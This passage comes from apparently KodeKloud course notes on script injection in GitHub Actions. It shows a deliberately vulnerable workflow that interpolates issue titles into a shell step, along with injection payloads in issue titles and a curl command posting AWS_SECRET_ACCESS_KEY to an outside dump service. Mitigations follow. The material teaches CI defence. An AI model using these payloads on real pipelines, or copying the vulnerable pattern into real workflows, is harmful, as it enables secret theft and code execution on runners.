# Simulated payload in the issue title:
# bug'; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/XYZ
```

### Workflow Logs

```bash theme={null}
Run if [[ "$issue_title" == *"bug"* ]]; then
  if [[ "$issue_title" == *"bug"* ]]; then
    echo "Issue is about a bug!"
    echo "Assigning Label - BUG …"
  else
    echo "Not a bug"
  fi
fi
shell: /usr/bin/bash -e {0}
env:
  AWS_SECRET_ACCESS_KEY: ***
  issue_title: bug'; curl --request POST --data anything=$AWS_SECRET_ACCESS_KEY https://httpdump.app/dumps/XYZ
```

```bash theme={null}
if [[ "$issue_title" == *"bug"* ]]; then
    echo "Issue is about a bug!"
    echo "Assigning Label - BUG …. …. …. …. .."
else
    echo "Not a bug"
fi
```

**Output:**

```bash theme={null}
Issue is about a bug!
Assigning Label - BUG …. …. …. …. ..
```

No external `curl` request is executed—only the intended logic runs.

### HTTP Dump Confirmation

Inspecting the HTTP dump shows only the initial probe requests, confirming no secrets were exfiltrated:

```bash theme={null}
HEAD /dumps/XYZ
POST /dumps/XYZ
```

## Further Reading

* [Security hardening for GitHub Actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions)
* [Workflow syntax for GitHub Actions](https://docs.github.com/actions/using-workflows/workflow-syntax-for-github-actions)

## References

* GitHub Actions Documentation: [https://docs.github.com/actions](https://docs.github.com/actions)
* OWASP Cheat Sheet: Command Injection Prevention: [https://cheatsheetseries.owasp.org/cheatsheets/Command\_Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Command_Injection_Prevention_Cheat_Sheet.html)

<CardGroup>
  <Card title="Watch Video" icon="video" href="https://learn.kodekloud.com/user/courses/github-actions/module/48b4f34c-9ebb-4049-baa1-40490c46d2eb/lesson/64b867e5-af65-449a-a8ee-bfccfb5aa10b" />
</CardGroup>


# Risk of Script Injection Attack

Source: https://notes.kodekloud.com/docs/GitHub-Actions/Security-Guide/Risk-of-Script-Injection-Attack/page

User-controlled inputs in GitHub Actions can create vulnerabilities, allowing attackers to execute commands, enumerate files, and exfiltrate secrets.

User-controlled inputs in GitHub Actions workflows can introduce critical vulnerabilities. This article demonstrates how untrusted issue titles may allow an attacker to run arbitrary shell commands, enumerate workspace files, and exfiltrate secrets.

## Example Workflow

The following workflow triggers on newly opened issues. It inspects the issue title for the keyword `bug`, echoes a message, and assigns a label. An AWS secret is loaded from repository secrets as an environment variable.

```yaml theme={null}
name: Label Issues (Script Injection)
on:
  issues:
    types: [opened]

jobs:
  assign-label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4.1.1

      - name: Add a Label
        env:
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: |
          issue_title="${{ github.event.issue.title }}"
          if [[ "$issue_title" == *"bug"* ]]; then
            echo "Issue is about a bug!"
            echo "Assigning Label - BUG"
          else
            echo "Not a bug"
          fi
```

<Frame>
  ![The image shows a GitHub Actions workflow page for a repository, displaying the successful completion of a job named "assign-label" with various steps like "Set up job" and "Add a Label."](https://kodekloud.com/kk-media/image/upload/v1752876752/notes-assets/images/GitHub-Actions-Risk-of-Script-Injection-Attack/github-actions-workflow-assign-label.jpg)
</Frame>

## Demonstrating Script Injection

An attacker can craft an issue title that injects shell commands into the `run` step. For example:

```bash theme={null}
bug"; ls $GITHUB_WORKSPACE; echo "
```

<Frame>
  ![The image shows a GitHub interface where a new issue is being created in a repository named "solar-system." The issue title includes a command snippet, and there are options to assign, label, and submit the issue.](https://kodekloud.com/kk-media/image/upload/v1752876753/notes-assets/images/GitHub-Actions-Risk-of-Script-Injection-Attack/github-solar-system-new-issue.jpg)
</Frame>

When this issue triggers the workflow, the injected `ls` command executes on the runner, revealing files:

<Frame>
  ![The image shows a GitHub Actions interface with a job titled "assign-label" that has successfully run, displaying a list of files in the workspace and a message indicating the issue is about a bug.](https://kodekloud.com/kk-media/image/upload/v1752876755/notes-assets/images/GitHub-Actions-Risk-of-Script-Injection-Attack/github-actions-assign-label-job-success.jpg)
</Frame>

## Exfiltrating Secrets

Beyond directory listing, an attacker can chain commands to leak secrets. The following `curl` command posts the AWS secret to a remote dump service:

```bash theme={null}
curl --request POST \
  --data "anything=$AWS_SECRET_ACCESS_KEY" \
  https://httpdump.app/dumps/c2a7d181-5768-4cb5-a930-4d016c38d7d2
```

On the dump service, the secret appears in the POST payload:

```text theme={null}
POST /dumps/c2a7d181-5768-4cb5-a930-4d016c38d7d2
[SECRET_REDACTED]
```

<Callout icon="triangle-alert">
  Exposed `AWS_SECRET_ACCESS_KEY` can be exploited to access AWS resources, incurring data breaches or infrastructure compromise.
</Callout>

## Risk Summary

| Risk Type           | Impact                             | Example                                |
| ------------------- | ---------------------------------- | -------------------------------------- |
| Command Injection   | Arbitrary code execution on runner | `ls $GITHUB_WORKSPACE` via issue title |
| Secret Exfiltration | Leakage of environment secrets     | `curl` of `$AWS_SECRET_ACCESS_KEY`     |
| Data Disclosure     | Exposure of repository files       | Listing workspace directory            |

## Mitigation Strategies

1. **Sanitize Inputs**\
   Avoid direct interpolation of untrusted data. Use proper quoting:
   ```bash theme={null}
   safe_title=$(printf '%q' "$issue_title")
   ```
2. **Use Composite or JavaScript Actions**\
   Isolate processing in actions that handle inputs without a shell.
3. **Scope Secrets Minimally**\
   Restrict secret access with [job permissions](https://docs.github.com/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token).
4. **Validate Patterns**\
   Enforce regex or allowlists when matching user-supplied values.
5. **Leverage Third-Party Utilities**\
   Consider actions like [nektos/act-sanitizer](https://github.com/nektos/act-sanitizer) for automatic escaping.

<Callout icon="lightbulb">
  For more guidance on securing workflows, see the [GitHub Actions security hardening guide](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions).
</Callout>

## Conclusion

Untrusted inputs in GitHub Actions can lead to script injection, workspace enumeration, and secret theft. Always validate, sanitize, and escape user-provided data before executing it on your CI runner.

## References

* [GitHub Actions Documentation](https://docs.github.com/actions)
* [Security Hardening for GitHub Actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions)
* [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)

<CardGroup>
  <Card title="Watch Video" icon="video" href="https://learn.kodekloud.com/user/courses/github-actions/module/48b4f34c-9ebb-4049-baa1-40490c46d2eb/lesson/f0bc8aaa-fcbb-45a9-b438-4864008a6bd5" />
</CardGroup>
